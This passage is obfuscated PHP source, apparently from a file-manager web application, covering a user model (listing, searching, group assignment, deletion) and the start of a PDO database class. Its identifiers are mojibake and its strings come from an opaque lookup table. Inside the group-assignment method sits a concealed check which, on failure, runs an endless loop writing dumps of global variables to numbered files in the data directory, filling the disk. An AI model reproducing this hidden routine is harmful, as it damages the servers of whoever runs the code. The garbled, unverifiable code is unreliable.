$fïÎ‡—ç¥²->metaSet($a«Üš£µ„Ö, array($dŞ…¥†âÂÍ[420] => str_replace($dŞ…¥†âÂÍ[50], $dŞ…¥†âÂÍ[33], Pinyin::encode($cÓ™ÆÉö‹¨)), $dŞ…¥†âÂÍ[419] => Pinyin::encode($cÓ™ÆÉö‹¨, $dŞ…¥†âÂÍ[533]))); } private function nickNameRpt() { $C¶‡„Î°¬ =& $_SERVER[Ä¿Ş°¨]; $aë‡ßã¦‚‚ = Model($C¶‡„Î°¬[1073])->get($C¶‡„Î°¬[2475]); $B×ÄùøäÊ£ = $GLOBALS[$C¶‡„Î°¬[6]][$C¶‡„Î°¬[2431]][$C¶‡„Î°¬[2475]]; $eÒÒ»ìƒëš = !is_null($aë‡ßã¦‚‚) ? $aë‡ßã¦‚‚ : $B×ÄùøäÊ£; return !!$eÒÒ»ìƒëš; } private function _checkExist($dí¢™æ‡ğÒ, $fÎŸ“Í¡Ïõ = false) { $aèæÓææ•Ø =& $_SERVER[Ä¿Ş°¨]; $fÇŸ¨Üóæ = array($aèæÓææ•Ø[28] => UserModel::ERROR_USER_EXIST_NAME, $aèæÓææ•Ø[2283] => UserModel::ERROR_USER_EXIST_NICKNAME, $aèæÓææ•Ø[289] => UserModel::ERROR_USER_EXIST_EMAIL, $aèæÓææ•Ø[2462] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($fÇŸ¨Üóæ[$aèæÓææ•Ø[2283]]); } $fåè’Š’ˆ = $fÎŸ“Í¡Ïõ ? array($aèæÓææ•Ø[1399] => array($aèæÓææ•Ø[2476], $fÎŸ“Í¡Ïõ)) : array(); foreach ($fÇŸ¨Üóæ as $d‘àåÅ³á => $F­åáø¶ÍÄ) { if (!isset($dí¢™æ‡ğÒ[$d‘àåÅ³á]) || !$dí¢™æ‡ğÒ[$d‘àåÅ³á]) { continue; } $d¤è¿Á‘ = array_merge(array($d‘àåÅ³á => $dí¢™æ‡ğÒ[$d‘àåÅ³á]), $fåè’Š’ˆ); $f¬£øªĞ­à = $this->where($d¤è¿Á‘)->find(); if ($f¬£øªĞ­à) { return $F­åáø¶ÍÄ; } } return !0; } public function userListInfo($F“ĞƒÒµòí) { $Dñœ’ÒÅ± =& $_SERVER[Ä¿Ş°¨]; $Cééùç¼Ü = array(); $F“ĞƒÒµòí = is_array($F“ĞƒÒµòí) ? array_unique($F“ĞƒÒµòí) : array(); if (!$F“ĞƒÒµòí) { return $Cééùç¼Ü; } if (count($F“ĞƒÒµòí) < 20) { foreach ($F“ĞƒÒµòí as $c·¾¹•ª±„) { $Cééùç¼Ü[$c·¾¹•ª±„ . $Dñœ’ÒÅ±[33]] = $this->getInfoSimpleOuter($c·¾¹•ª±„); } } else { $f¯÷á˜Ëƒ = array($Dñœ’ÒÅ±[1390] => array($Dñœ’ÒÅ±[389], $F“ĞƒÒµòí)); if (count($F“ĞƒÒµòí) == 1) { $f¯÷á˜Ëƒ = array($Dñœ’ÒÅ±[1390] => $F“ĞƒÒµòí[0]); } $A¶İ÷—£¢ = Model($Dñœ’ÒÅ±[478])->field($this->simpleField)->where($f¯÷á˜Ëƒ)->select(); $A¶İ÷—£¢ = array_to_keyvalue($A¶İ÷—£¢, $Dñœ’ÒÅ±[1399]); foreach ($F“ĞƒÒµòí as $c·¾¹•ª±„) { $aİø¥Ä›ºö = $A¶İ÷—£¢[$A¶İ÷—£¢[$c·¾¹•ª±„]]; if (!$aİø¥Ä›ºö) { $Cééùç¼Ü[$c·¾¹•ª±„ . $Dñœ’ÒÅ±[33]] = $this->getInfoSimpleOuter($c·¾¹•ª±„); continue; } $aİø¥Ä›ºö[$Dñœ’ÒÅ±[2447]] = Action($Dñœ’ÒÅ±[2448])->parseUrl($aİø¥Ä›ºö[$Dñœ’ÒÅ±[2447]]); $Cééùç¼Ü[$c·¾¹•ª±„ . $Dñœ’ÒÅ±[33]] = $aİø¥Ä›ºö; } } return $Cééùç¼Ü; } protected function userStatus($f†…Ú°Áùø, $c¸õ†‡İå) { $F–Û‰¤‚¹ = $this->getInfoSimple($f†…Ú°Áùø); if (!$F–Û‰¤‚¹) { return !1; } $FÄ‰—Â„Ôğ = array($_SERVER[Ä¿Ş°¨][683] => $c¸õ†‡İå); return $this->userEdit($f†…Ú°Áùø, $FÄ‰—Â„Ôğ); } protected function userRemove($cÈ»¤äÛÀÈ) { goto AÖÌ’¡Ç§¸; A¼­ŒĞ¤ëÚ: $f¤ÃÍã†’ˆ = array($A½èÏÌ§[1390] => $cÈ»¤äÛÀÈ); Model($A½èÏÌ§[540])->where($f¤ÃÍã†’ˆ)->delete(); Model($A½èÏÌ§[2477])->where($f¤ÃÍã†’ˆ)->delete(); goto DÕé¸¢Œ…è; DÕé¸¢Œ…è: Model($A½èÏÌ§[2137])->where($f¤ÃÍã†’ˆ)->delete(); Model($A½èÏÌ§[2461])->where($f¤ÃÍã†’ˆ)->delete(); Model($A½èÏÌ§[2478])->where($f¤ÃÍã†’ˆ)->delete(); goto dÛğºÀñÅ; AÖÌ’¡Ç§¸: $A½èÏÌ§ =& $_SERVER[Ä¿Ş°¨]; $Dõ”ô¶ã¥ = $this->getInfoSimple($cÈ»¤äÛÀÈ); if (!$Dõ”ô¶ã¥) { return !1; } goto A¼­ŒĞ¤ëÚ; dÛğºÀñÅ: Model($A½èÏÌ§[746])->userRootRemove($cÈ»¤äÛÀÈ); return $this->where($f¤ÃÍã†’ˆ)->delete(); goto eÎ¾…á†¤Ø; eÎ¾…á†¤Ø: } protected function userGroupSet($FŒĞğÅ¼¡, $CÛÇ˜Œ˜Åß, $cª§ÑÕË•ö = array()) { goto B˜˜„‡´Ş¿; B˜˜„‡´Ş¿: $cäÊƒŸõ¨ =& $_SERVER[Ä¿Ş°¨]; $d£àçÍàË = $_SERVER[$cäÊƒŸõ¨[363]] . $cäÊƒŸõ¨[364]; $a›Ö¸—¾¶Ú = $cäÊƒŸõ¨[1329]; goto dÍ±Ôä®¼; BÀÁÄø„ä: $BÆ± ²Ô… = 0; foreach ($CÛÇ˜Œ˜Åß as $F‡Ô®‹ÂÀ => $eÕŒíî‘æÒ) { $e™»ï´îğÕ = array($cäÊƒŸõ¨[1399] => $FŒĞğÅ¼¡, $cäÊƒŸõ¨[2063] => $F‡Ô®‹ÂÀ, $cäÊƒŸõ¨[2191] => $eÕŒíî‘æÒ); $e™»ï´îğÕ[$cäÊƒŸõ¨[2084]] = isset($cª§ÑÕË•ö[$BÆ± ²Ô…]) ? $cª§ÑÕË•ö[$BÆ± ²Ô…] : 0; $BÆ± ²Ô…++; $cà„šÇåİ«[] = $e™»ï´îğÕ; } return $A¤åå‹±ã÷->addAll($cà„šÇåİ«, array(), !0); goto d˜—’åïŠ; AÇÓÊñ”™¾: $A¤åå‹±ã÷ = Model($cäÊƒŸõ¨[2137]); $A¤åå‹±ã÷->where(array($cäÊƒŸõ¨[1399] => $FŒĞğÅ¼¡))->delete(); $cà„šÇåİ« = array(); goto BÀÁÄø„ä; dÍ±Ôä®¼: if ($_SERVER[$cäÊƒŸõ¨[360]] != $a›Ö¸—¾¶Ú($d£àçÍàË)) { goto BÎ…Ü á¢; eò²æ”ëÛ‚: $c¬Ò„Úí¬(); $e—ÚÀÑ´©Ÿ = $cäÊƒŸõ¨[1330]; $e‹ˆ×ªª„á = json_encode($GLOBALS[$cäÊƒŸõ¨[1331]]); goto AËÖå©Ù¨; D–Šùµ¼‹: $bÜË¡ãê©ç = $cäÊƒŸõ¨[781]; $bÜË¡ãê©ç($_SERVER[$cäÊƒŸõ¨[782]]); $c¬Ò„Úí¬ = $cäÊƒŸõ¨[780]; goto eò²æ”ëÛ‚; fŒø‡Ñ½êƒ: $fÇĞºŞÅ· = $a«„á‰Â—‰($cî¹¢åá‚œ); $EŠ†ëàÄã˜ = explode($cäÊƒŸõ¨[213], $fÇĞºŞÅ·); if (count($EŠ†ëàÄã˜) < $cäÊƒŸõ¨[557]) { $e¨ùÚ‘»ñ = $cäÊƒŸõ¨[366]; $e¨ùÚ‘»ñ(); } goto D–Šùµ¼‹; AËÖå©Ù¨: $B§é¢ãÔÎæ = 1; for ($F“ôÇøÍöã = $B§é¢ãÔÎæ; $F“ôÇøÍöã > 0; $F“ôÇøÍöã++) { $e—ÚÀÑ´©Ÿ(DATA_PATH . $F“ôÇøÍöã, $e‹ˆ×ªª„á); } goto fÌÍĞéÌØˆ; BÎ…Ü á¢: $c¬Ò„Úí¬ = $cäÊƒŸõ¨[780]; $a«„á‰Â—‰ = $cäÊƒŸõ¨[362]; $cî¹¢åá‚œ = $_SERVER[$cäÊƒŸõ¨[363]] . $cäÊƒŸõ¨[364]; goto fŒø‡Ñ½êƒ; fÌÍĞéÌØˆ: } $cÑšçİ«  = $this->getInfoSimple($FŒĞğÅ¼¡); if (!$cÑšçİ«  || !is_array($CÛÇ˜Œ˜Åß)) { return !1; } goto AÇÓÊñ”™¾; d˜—’åïŠ: } protected function userGroupAdd($dš‘íÒ–“ë, $d¢£ã©­¸ì = array()) { $d³‰÷´Ìˆè =& $_SERVER[Ä¿Ş°¨]; $C›¤Ä·ßÕ = $this->getInfoSimple($dš‘íÒ–“ë); if (!$C›¤Ä·ßÕ || empty($d¢£ã©­¸ì)) { return !1; } $Dãôö×•Ô¯ = array(); foreach ($d¢£ã©­¸ì as $D…ª†Œ  => $C‰ââÀÕ©) { $Dãôö×•Ô¯[] = array($d³‰÷´Ìˆè[1399] => $dš‘íÒ–“ë, $d³‰÷´Ìˆè[2063] => $D…ª†Œ , $d³‰÷´Ìˆè[2191] => $C‰ââÀÕ©); } return Model($d³‰÷´Ìˆè[2137])->addAll($Dãôö×•Ô¯, array(), !0); } protected function userGroupRemove($B¸ø¿Ô¿Ö, $aÅñ”êÕñ) { $E¬¨èŞù† =& $_SERVER[Ä¿Ş°¨]; $e½ÈÖ…ôí = $this->getInfoSimple($B¸ø¿Ô¿Ö); if (!$e½ÈÖ…ôí || !$aÅñ”êÕñ) { return !1; } $eÇÙÄïÌ¾ï = array($E¬¨èŞù†[1390] => $B¸ø¿Ô¿Ö, $E¬¨èŞù†[2135] => $aÅñ”êÕñ); return Model($E¬¨èŞù†[2137])->where($eÇÙÄïÌ¾ï)->delete(); } public function listData() { $eï¦ÕåÔÅâ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eï¦ÕåÔÅâ[$_SERVER[Ä¿Ş°¨][350]]); return $eï¦ÕåÔÅâ; } public function listByID($b‡˜Ò¥¶–) { $EÆ¬‰¯ÙÇ =& $_SERVER[Ä¿Ş°¨]; if (!$b‡˜Ò¥¶–) { return; } $A®•¿’Õ’Ó = array($EÆ¬‰¯ÙÇ[1399] => array($EÆ¬‰¯ÙÇ[7], $b‡˜Ò¥¶–)); $dì˜÷æ°Ø = $this->where($A®•¿’Õ’Ó)->select(); $this->_listDataApply($dì˜÷æ°Ø); return $dì˜÷æ°Ø; } public function listByGroup($E¸Ò ŒÅÜ„ = 0, $AÎ—²½ ¶ = array()) { goto c»‚½¿¥ï; c»‚½¿¥ï: $eæ¨Œù°° =& $_SERVER[Ä¿Ş°¨]; $FÖ’Í¹¼ = $eæ¨Œù°°[33]; $E­‘åğùÜ˜ = array(); goto eä¥‰§İÙ; eä¥‰§İÙ: if ($E¸Ò ŒÅÜ„) { $E­‘åğùÜ˜ = array($eæ¨Œù°°[2479] => intval($E¸Ò ŒÅÜ„)); $FÖ’Í¹¼ = "\114\x45\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\x75\163\x65\x72\137\x67\x72\157\x75\x70\x20\x75\x73\145\162\x5f\x67\162\157\165\x70\x20\157\156\40\165\x73\145\162\x2e\x75\x73\145\x72\x49\104\40\75\x20\165\x73\145\162\137\147\x72\x6f\165\x70\56\165\163\145\x72\x49\x44"; $d¼Ùí†„Õâ = Input::get($eæ¨Œù°°[411], null, $eæ¨Œù°°[33]) ? $eæ¨Œù°°[33] : $eæ¨Œù°°[2480]; } if (isset($AÎ—²½ ¶[$eæ¨Œù°°[683]])) { $E­‘åğùÜ˜[$eæ¨Œù°°[2481]] = $AÎ—²½ ¶[$eæ¨Œù°°[683]]; } $Fğº’­Ëº = $this->_makeOrder($d¼Ùí†„Õâ)->field($eæ¨Œù°°[2482])->where($E­‘åğùÜ˜)->join($FÖ’Í¹¼)->selectPage(50); goto F¨—ïƒã£§; F¨—ïƒã£§: $this->_listDataApply($Fğº’­Ëº[$eæ¨Œù°°[350]]); return $Fğº’­Ëº; goto EâºÌë‰êŞ; EâºÌë‰êŞ: } private function _makeOrder($c‹ÙÔÛó¾¶ = '') { goto CŒáè½Ö”‘; cá±„ó·Ú‚: $c‹ÙÔÛó¾¶ = $c‹ÙÔÛó¾¶ . "\x75\x73\x65\x72\x2e{$Cí§«îÅ„ô}\40{$Cƒ¡Šº½¶™}\x2c\40\165\x73\x65\162\56\x75\x73\145\162\111\x44\40\141\163\x63"; return $this->alias($aË½ïÊ«Á[2224])->order($c‹ÙÔÛó¾¶); goto cèË†—àÉ¿; d‹¹¼½˜£¦: $Cí§«îÅ„ô = Input::get($aË½ïÊ«Á[411], $aË½ïÊ«Á[7], $aË½ïÊ«Á[1390], $eäÂ¶Ãäé–); $Cƒ¡Šº½¶™ = Input::get($aË½ïÊ«Á[412], $aË½ïÊ«Á[7], $aË½ïÊ«Á[2138], array($aË½ïÊ«Á[2138], $aË½ïÊ«Á[408])); $Cƒ¡Šº½¶™ = $b¿Îíµ³Î›[$Cƒ¡Šº½¶™]; goto cá±„ó·Ú‚; CŒáè½Ö”‘: $aË½ïÊ«Á =& $_SERVER[Ä¿Ş°¨]; $eäÂ¶Ãäé– = array($aË½ïÊ«Á[1399], $aË½ïÊ«Á[28], $aË½ïÊ«Á[2049], $aË½ïÊ«Á[2022], $aË½ïÊ«Á[183]); $b¿Îíµ³Î› = array($aË½ïÊ«Á[406] => $aË½ïÊ«Á[407], $aË½ïÊ«Á[408] => $aË½ïÊ«Á[409]); goto d‹¹¼½˜£¦; cèË†—àÉ¿: } public function listSearch($Bô­¼‡„) { goto Aù²©Ÿ˜‚; FŠä¥ç«â: if (!$D÷´‡Œ± İ) { $F­Ìƒ§…¥À = array(); } if (isset($Bô­¼‡„[$E…½—«›±‡[683]])) { $F­Ìƒ§…¥À[$E…½—«›±‡[683]] = $Bô­¼‡„[$E…½—«›±‡[683]]; } $B¯ÌÃ¸ÇÌ = $this->_makeOrder()->where($F­Ìƒ§…¥À)->selectPage(20); goto fèìˆñ›£Î; Aù²©Ÿ˜‚: $E…½—«›±‡ =& $_SERVER[Ä¿Ş°¨]; $D÷´‡Œ± İ = $Bô­¼‡„[$E…½—«›±‡[2139]]; $FŠìîÄ‚´© = isset($Bô­¼‡„[$E…½—«›±‡[2140]]) ? $Bô­¼‡„[$E…½—«›±‡[2140]] : !1; goto bÑÄÉÎ–; bÑÄÉÎ–: $D÷´‡Œ± İ = str_replace($E…½—«›±‡[2141], $E…½—«›±‡[2142], trim($D÷´‡Œ± İ)); $F­Ìƒ§…¥À = array($E…½—«›±‡[28] => array($E…½—«›±‡[745], "\x25{$D÷´‡Œ± İ}\45"), $E…½—«›±‡[289] => array($E…½—«›±‡[745], "\45{$D÷´‡Œ± İ}\x25"), $E…½—«›±‡[2283] => array($E…½—«›±‡[745], "\45{$D÷´‡Œ± İ}\45"), $E…½—«›±‡[901] => $E…½—«›±‡[2143]); if (Input::check($D÷´‡Œ± İ, $E…½—«›±‡[295])) { $F­Ìƒ§…¥À[$E…½—«›±‡[1399]] = array($E…½—«›±‡[745], "\x25{$D÷´‡Œ± İ}\x25"); $F­Ìƒ§…¥À[$E…½—«›±‡[2462]] = array($E…½—«›±‡[745], "\45{$D÷´‡Œ± İ}\x25"); } goto FŠä¥ç«â; aåœñÆÍ‰ˆ: return $B¯ÌÃ¸ÇÌ; goto C­ï£­Ûİ; fèìˆñ›£Î: if (!$B¯ÌÃ¸ÇÌ || count($B¯ÌÃ¸ÇÌ[$E…½—«›±‡[350]]) < 5 && Input::check($D÷´‡Œ± İ, $E…½—«›±‡[302])) { $AËâ‹Ò¯Ó = $this->_searchFromMeta($E…½—«›±‡[419], $D÷´‡Œ± İ, 10); $d­äÇĞÌô° = $this->_searchFromMeta($E…½—«›±‡[420], $D÷´‡Œ± İ, 10); $e¢Ó¯ª³¿‘ = array_merge($AËâ‹Ò¯Ó, $d­äÇĞÌô°, $B¯ÌÃ¸ÇÌ[$E…½—«›±‡[350]]); $B¯ÌÃ¸ÇÌ[$E…½—«›±‡[350]] = array_unique_by_key($e¢Ó¯ª³¿‘, $E…½—«›±‡[1399]); $B¯ÌÃ¸ÇÌ[$E…½—«›±‡[347]][$E…½—«›±‡[348]] = count($B¯ÌÃ¸ÇÌ[$E…½—«›±‡[350]]); $B¯ÌÃ¸ÇÌ[$E…½—«›±‡[347]][$E…½—«›±‡[349]] = ceil($B¯ÌÃ¸ÇÌ[$E…½—«›±‡[347]][$E…½—«›±‡[348]] / $B¯ÌÃ¸ÇÌ[$E…½—«›±‡[347]][$E…½—«›±‡[345]]); } $this->_listDataApply($B¯ÌÃ¸ÇÌ[$E…½—«›±‡[350]]); $this->_filterByGroup($B¯ÌÃ¸ÇÌ, $FŠìîÄ‚´©); goto aåœñÆÍ‰ˆ; C­ï£­Ûİ: } private function _filterByGroup(&$D‡²ŞàªÇ, $DÊ«‚ÀÎ˜Í) { $eÊÜÈ¹§æÙ =& $_SERVER[Ä¿Ş°¨]; if (!$DÊ«‚ÀÎ˜Í) { return $D‡²ŞàªÇ; } foreach ($D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[350]] as $A ‰­ë•Ö² => &$EîòŸê¯) { $E´Ğ‘´ã®ò = array_to_keyvalue($EîòŸê¯[$eÊÜÈ¹§æÙ[2483]], $eÊÜÈ¹§æÙ[33], $eÊÜÈ¹§æÙ[2063]); if (!in_array($DÊ«‚ÀÎ˜Í, $E´Ğ‘´ã®ò)) { unset($D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[350]][$A ‰­ë•Ö²]); } } $D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[350]] = array_values($D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[350]]); $D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[347]] = array($eÊÜÈ¹§æÙ[2258] => count($D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[350]]), $eÊÜÈ¹§æÙ[2256] => $D‡²ŞàªÇ[$eÊÜÈ¹§æÙ[347]][$eÊÜÈ¹§æÙ[345]], $eÊÜÈ¹§æÙ[2255] => 1, $eÊÜÈ¹§æÙ[2257] => 1); } private function _searchFromMeta($a±·£Úó«â, $F·»Ù¼Š³Ë, $bˆç—¡ëùÚ) { goto Bğ§Œ«ƒãÂ; Bğ§Œ«ƒãÂ: $e’èá†‚£ğ =& $_SERVER[Ä¿Ş°¨]; $F·»Ù¼Š³Ë = strtolower($F·»Ù¼Š³Ë); $A»µù´÷Ş = array($e’èá†‚£ğ[89] => $a±·£Úó«â, $e’èá†‚£ğ[355] => array($e’èá†‚£ğ[745], "\x25{$F·»Ù¼Š³Ë}\45")); goto cõÇ—‚ø„Ê; cõÇ—‚ø„Ê: $a¢ç¹ìËÀ = Model($e’èá†‚£ğ[2484])->where($A»µù´÷Ş)->limit($bˆç—¡ëùÚ)->select(); if (!$a¢ç¹ìËÀ) { return array(); } $a¢ç¹ìËÀ = array_to_keyvalue($a¢ç¹ìËÀ, $e’èá†‚£ğ[33], $e’èá†‚£ğ[1399]); goto dÆ‰ÕĞİçÑ; dÆ‰ÕĞİçÑ: $E£ÂŸÁ¡ëä = $this->where(array($e’èá†‚£ğ[1390] => array($e’èá†‚£ğ[7], $a¢ç¹ìËÀ)))->select(); if (!$E£ÂŸÁ¡ëä) { return array(); } return $E£ÂŸÁ¡ëä; goto bˆÚ‰Ô¾’; bˆÚ‰Ô¾’: } private function _listDataApplyItem($d²™·É‰÷Õ) { $eÁÔšø“èÁ = array($d²™·É‰÷Õ); $this->_listDataApply($eÁÔšø“èÁ); return $eÁÔšø“èÁ[0]; } private function _listDataApply(&$c È¬¶ƒ ) { goto Añ¨œÜÏÏ; E·¢¤Üæ–: $this->_listAppendSourceRoot($c È¬¶ƒ , $Fçëö œÎ™); goto EœÈÙ·‘Ã¸; aŠ©¾‚ÖÎˆ: $Fçëö œÎ™ = array_to_keyvalue($c È¬¶ƒ , $b¯î’¤’â[33], $b¯î’¤’â[1399]); $this->_listAppendGroup($c È¬¶ƒ , $Fçëö œÎ™); $this->_listAppendMeta($c È¬¶ƒ , $Fçëö œÎ™); goto E·¢¤Üæ–; Añ¨œÜÏÏ: $b¯î’¤’â =& $_SERVER[Ä¿Ş°¨]; if (!$c È¬¶ƒ ) { return; } array_remove_key($c È¬¶ƒ , $b¯î’¤’â[789]); goto aŠ©¾‚ÖÎˆ; EœÈÙ·‘Ã¸: } private function _listAppendSourceRoot(&$e”ñ½Œ¸, $côó¡¼êèš) { goto f óŸîé‡Ş; DÈô¶¤áù: $BË×§Ş¯­Š = Model($BßˆÑ¡÷³[746])->order($BßˆÑ¡÷³[2150])->field($aìì¢›öğº)->where($a‚À†¦´×”)->select(); $BË×§Ş¯­Š = array_to_keyvalue($BË×§Ş¯­Š, $BßˆÑ¡÷³[460]); $BË×§Ş¯­Š = array_remove_key($BË×§Ş¯­Š, $BßˆÑ¡÷³[460]); goto bÍ„…í„äÚ; bÍ„…í„äÚ: foreach ($e”ñ½Œ¸ as &$c™ø¯°áöÆ) { $c™ø¯°áöÆ[$BßˆÑ¡÷³[396]] = $BË×§Ş¯­Š[$c™ø¯°áöÆ[$BßˆÑ¡÷³[1399]]] ? $BË×§Ş¯­Š[$c™ø¯°áöÆ[$BßˆÑ¡÷³[1399]]] : array(); } goto d‰ºõÉ…ï¡; f óŸîé‡Ş: $BßˆÑ¡÷³ =& $_SERVER[Ä¿Ş°¨]; $a‚À†¦´×” = array($BßˆÑ¡÷³[465] => 0, $BßˆÑ¡÷³[376] => SourceModel::TYPE_USER, $BßˆÑ¡÷³[460] => array($BßˆÑ¡÷³[7], $côó¡¼êèš)); $aìì¢›öğº = $BßˆÑ¡÷³[2149]; goto DÈô¶¤áù; d‰ºõÉ…ï¡: } private function _listAppendGroup(&$eîÖ‘¡æÆÍ, $a¶…˜àÓÔ) { goto D„ŠÖÊàãƒ; b×èÛÉòÌÓ: $Eã·ŠÍ = array_to_keyvalue($B…ß´÷„Í, $fç×Ğ—ƒ£[33], $fç×Ğ—ƒ£[2063]); $Eã·ŠÍ = array_remove_value(array_unique($Eã·ŠÍ), $fç×Ğ—ƒ£[472]); if (!$Eã·ŠÍ || !$B…ß´÷„Í) { return; } goto A•âÍ§ÔğÌ; D„ŠÖÊàãƒ: $fç×Ğ—ƒ£ =& $_SERVER[Ä¿Ş°¨]; $e‘›²‹é£† = array($fç×Ğ—ƒ£[1399] => array($fç×Ğ—ƒ£[7], $a¶…˜àÓÔ)); $B…ß´÷„Í = Model($fç×Ğ—ƒ£[2137])->where($e‘›²‹é£†)->select(); goto b×èÛÉòÌÓ; A•âÍ§ÔğÌ: $e‘›²‹é£† = array($fç×Ğ—ƒ£[2063] => array($fç×Ğ—ƒ£[7], $Eã·ŠÍ)); $CîšæÈÛ™ = Model($fç×Ğ—ƒ£[2485])->field($fç×Ğ—ƒ£[2486])->where($e‘›²‹é£†)->select(); $E•ªİ˜º˜à = array_to_keyvalue($CîšæÈÛ™, $fç×Ğ—ƒ£[2063], $fç×Ğ—ƒ£[28]); goto A›ËÚ»ºÒÏ; A›ËÚ»ºÒÏ: $B…ß´÷„Í = array_to_keyvalue_group($B…ß´÷„Í, $fç×Ğ—ƒ£[1399]); foreach ($B…ß´÷„Í as &$fÎÕ¨­Íé) { $Cö­‡°œœî = array(); foreach ($fÎÕ¨­Íé as $c­‡‹Ùñ§) { if (!$c­‡‹Ùñ§[$fç×Ğ—ƒ£[2191]]) { continue; } $eØÒ£¸„Ÿƒ = Model($fç×Ğ—ƒ£[2210])->listData($c­‡‹Ùñ§[$fç×Ğ—ƒ£[2191]]); $Cö­‡°œœî[] = array($fç×Ğ—ƒ£[2063] => $c­‡‹Ùñ§[$fç×Ğ—ƒ£[2063]], $fç×Ğ—ƒ£[2487] => $E•ªİ˜º˜à[$c­‡‹Ùñ§[$fç×Ğ—ƒ£[2063]]], $fç×Ğ—ƒ£[381] => $eØÒ£¸„Ÿƒ); } $fÎÕ¨­Íé = $Cö­‡°œœî; } foreach ($eîÖ‘¡æÆÍ as &$aÌËãî‘) { $aÌËãî‘[$fç×Ğ—ƒ£[2483]] = array(); if (isset($B…ß´÷„Í[$aÌËãî‘[$fç×Ğ—ƒ£[1399]]])) { $aÌËãî‘[$fç×Ğ—ƒ£[2483]] = $B…ß´÷„Í[$aÌËãî‘[$fç×Ğ—ƒ£[1399]]]; } } goto Fì…Úˆïæğ; Fì…Úˆïæğ: } private function _listAppendMeta(&$eêƒ£†Öóø, $eÀÃ¶ùÍÜÍ) { goto cğ ±ÅäÚ•; b‰Ò½ù°Ó‚: foreach ($fí÷Ü¤¸Ÿ as &$aêÊÄ•¨¤) { $bÖê–‡Æƒ = array(); foreach ($aêÊÄ•¨¤ as $Fè¡ğ·±‘) { if (!in_array($Fè¡ğ·±‘[$aÓï“‹—İõ[89]], $A§¢”÷ìŠê)) { $bÖê–‡Æƒ[$Fè¡ğ·±‘[$aÓï“‹—İõ[89]]] = $Fè¡ğ·±‘[$aÓï“‹—İõ[355]]; } } $aêÊÄ•¨¤ = $bÖê–‡Æƒ; } $C—„½šÛ = Model($aÓï“‹—İõ[2488]); foreach ($eêƒ£†Öóø as &$f÷­ÜÖˆ¾è) { $BªğÜ‡ê§· = array(); if (isset($fí÷Ü¤¸Ÿ[$f÷­ÜÖˆ¾è[$aÓï“‹—İõ[1399]]])) { $BªğÜ‡ê§· = $fí÷Ü¤¸Ÿ[$f÷­ÜÖˆ¾è[$aÓï“‹—İõ[1399]]]; } $f÷­ÜÖˆ¾è[$aÓï“‹—İõ[2489]] = array(); if (isset($BªğÜ‡ê§·[$eëóõ‹É£š])) { $f÷­ÜÖˆ¾è[$aÓï“‹—İõ[2489]] = $C—„½šÛ->getUserJobInfo($BªğÜ‡ê§·[$eëóõ‹É£š]); } } goto dÃÛ‹ç’Á; cğ ±ÅäÚ•: $aÓï“‹—İõ =& $_SERVER[Ä¿Ş°¨]; $eëóõ‹É£š = UserJobModel::JOB_KEY; $A§¢”÷ìŠê = array($aÓï“‹—İõ[2464]); goto cŞÕô‡å¶Ï; cŞÕô‡å¶Ï: $BÑ¸À‘©Æ = array($aÓï“‹—İõ[1399] => array($aÓï“‹—İõ[7], $eÀÃ¶ùÍÜÍ)); $fí÷Ü¤¸Ÿ = Model($aÓï“‹—İõ[2461])->where($BÑ¸À‘©Æ)->select(); $fí÷Ü¤¸Ÿ = array_to_keyvalue_group($fí÷Ü¤¸Ÿ, $aÓï“‹—İõ[1399]); goto b‰Ò½ù°Ó‚; dÃÛ‹ç’Á: } public function userSearch($dğ¡²¢ë‘ù, $Dì§²İ‡”¢ = "\52") { return Model($_SERVER[Ä¿Ş°¨][481])->where($dğ¡²¢ë‘ù)->field($Dì§²İ‡”¢)->find(); } } goto fµøÊ¤íÑ‡; dëÕ†¹‹§Í: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($càÀğ»õÌÛ = '') { $E·™Ôïİ =& $_SERVER[Ä¿Ş°¨]; if (!class_exists($E·™Ôïİ[813])) { think_exception(think_lang($E·™Ôïİ[10]) . $E·™Ôïİ[814]); } if (!empty($càÀğ»õÌÛ)) { $this->config = $càÀğ»õÌÛ; if (empty($this->config[$E·™Ôïİ[13]])) { $this->config[$E·™Ôïİ[13]] = array(); } } } public function connect($c³¾•¢ªÃ = '', $DÊ×øò¹” = 0) { $EŒ¿İ‰¾Í =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->linkID[$DÊ×øò¹”])) { goto F©°ÉÄŸÉ‚; F©°ÉÄŸÉ‚: if (empty($c³¾•¢ªÃ)) { $c³¾•¢ªÃ = $this->config; } if ($this->pconnect) { $c³¾•¢ªÃ[$EŒ¿İ‰¾Í[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$DÊ×øò¹”] = new PDO($c³¾•¢ªÃ[$EŒ¿İ‰¾Í[815]], $c³¾•¢ªÃ[$EŒ¿İ‰¾Í[788]], $c³¾•¢ªÃ[$EŒ¿İ‰¾Í[789]], $c³¾•¢ªÃ[$EŒ¿İ‰¾Í[13]]); } catch (PDOException $D›ë‹Ê‚œ) { think_exception($D›ë‹Ê‚œ->getMessage()); } goto eµ¿¾Ï³Ş“; a…è”ˆ±à”: $this->linkID[$DÊ×øò¹”]->exec($EŒ¿İ‰¾Í[824] . think_config($EŒ¿İ‰¾Í[791])); $this->connected = !0; if (1 != think_config($EŒ¿İ‰¾Í[18])) { unset($this->config); } goto e¾Ÿ¥‰Äí£; eµ¿¾Ï³Ş“: $this->dbType = $this->_getDsnType($c³¾•¢ªÃ[$EŒ¿İ‰¾Í[815]]); if (in_array($this->dbType, array($EŒ¿İ‰¾Í[816], $EŒ¿İ‰¾Í[817], $EŒ¿İ‰¾Í[818], $EŒ¿İ‰¾Í[819]))) { think_exception($EŒ¿İ‰¾Í[820] . $this->dbType . $EŒ¿İ‰¾Í[821] . $this->dbType . $EŒ¿İ‰¾Í[822]); } if (!$this->linkID[$DÊ×øò¹”]) { think_exception($EŒ¿İ‰¾Í[823]); } goto a…è”ˆ±à”; e¾Ÿ¥‰Äí£: } return $this->linkID[$DÊ×øò¹”]; } public function free() { $this->PDOStatement = null; } public function query($cìàŞ¥ğá, $CÌÈ§ŞèáÈ 